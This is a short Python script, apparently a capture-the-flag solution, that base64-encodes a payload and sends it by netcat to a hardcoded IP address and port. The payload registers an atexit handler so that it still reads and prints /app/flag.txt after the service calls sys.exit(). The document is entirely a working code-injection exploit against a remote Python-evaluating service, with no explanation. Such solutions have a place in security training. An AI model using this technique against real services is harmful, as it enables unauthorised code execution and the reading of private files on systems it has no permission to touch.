#!/usr/bin/env python3
import base64
import subprocess

# Payload that uses atexit to execute after sys.exit()
payload = """
import atexit
import os

def read_flag():
    with open('/app/flag.txt', 'r') as f:
        print(f.read())

atexit.register(read_flag)
"""

# Encode the payload
encoded = base64.b64encode(payload.encode()).decode()
print("Encoded payload:")
print(encoded)
print("\nSending to server...")

# Send to the server
proc = subprocess.Popen(
    ["nc", "20.197.11.28", "9006"],
    stdin=subprocess.PIPE,
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
    text=True
)

stdout, stderr = proc.communicate(input=encoded + "\n", timeout=10)
print("\n=== OUTPUT ===")
print(stdout)
if stderr:
    print("\n=== STDERR ===")
    print(stderr)
